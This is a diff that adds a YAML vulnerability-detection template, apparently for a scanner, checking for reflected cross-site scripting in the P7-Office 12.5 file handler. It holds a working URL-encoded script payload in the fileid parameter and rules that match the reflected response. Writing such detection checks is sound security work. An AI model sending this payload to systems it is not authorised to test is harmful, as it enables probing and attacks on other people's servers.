@@ -1,0 +1,29 @@
+id: p7-office-xss
+brief:
+    title: Р7-Office 12.5 - Cross-Site Scripting
+    by: 0xpugal
+    level: medium
+    about: A failure to implement proper measures to protect the structure of the web page in the P7-Office corporate server could have allowed a remote attacker to perform a cross-site scripting (XSS) attack.
+    label:
+        - p7office
+        - xss
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/Products/Files/HttpHandlers/filehandler.ashx?action=thumb&fileid=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'
+      signs:
+        - "on": word
+          has:
+            - 'Can not convert id:'
+            - <script>alert(document.domain)</script>
+          in: body
+          need: all
+        - "on": word
+          has:
+            - text/html
+          in: content_type
+          need: all
+        - "on": status
+          status:
+            - 500
